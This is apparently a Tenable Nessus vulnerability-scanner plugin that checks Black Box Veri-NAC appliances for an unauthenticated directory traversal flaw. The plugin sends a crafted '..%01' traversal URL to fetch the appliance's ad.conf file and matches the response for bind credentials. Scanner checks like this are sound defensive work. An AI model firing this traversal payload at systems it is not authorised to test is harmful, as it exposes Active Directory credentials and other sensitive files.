#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(55022);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_bugtraq_id(48131);
  script_xref(name:"Secunia", value:"44757");
  script_osvdb_id(72895);

  script_name(english:"Veri-NAC Appliance unauthenticated URL Directory Traversal");
  script_summary(english:"Tries to retrieve the appliance's ad.conf file");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote web server is prone to a directory traversal attack."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The remote host appears to be a Black Box Veri-NAC network access
control appliance that allows an unauthenticated, remote attacker to
retrieve arbitrary files through its web server using specially
crafted requests with '/unauthenticated' followed by directory
traversal sequences at the start of the URL. 

This can result in the disclosure of sensitive information, such as
the device's Active Directory configuration file, shadow password
file, and the like."
  );
  # http://techworld.idg.se/2.2524/1.387616/blackbox-veri-nac---produkten-som-forstor-din-it-sakerhet/
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?613f7c63"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Update to version 8.0.10 as that is reported to address the issue."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/05/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/06/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Try to exploit the issue to retrieve a file.
file = '/var/user_def/ad.conf';
file_pat = '(sec_group|bind_user|bind_pass|get_user_info) *=';


url = '/unauthenticated/..%01/..%01/..%01/..%01' + file;
res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

if (res[2] && egrep(pattern:file_pat, string:res[2]))
{
  if (report_verbosity > 0)
  {
    report = 
      '\n' + 'Nessus was able to exploit the issue to retrieve the contents of' +
      '\n' + '\'' + file + '\' on the remote host using the following URL :' +
      '\n' +
      '\n' + '  ' + build_url(port:port, qs:url) + '\n';

    if (report_verbosity > 1)
      report += 
        '\n' + 'Here are its contents :' +
        '\n' +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
        '\n' + chomp(res[2]) +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, "The web server listening on port "+port+" is not affected.");
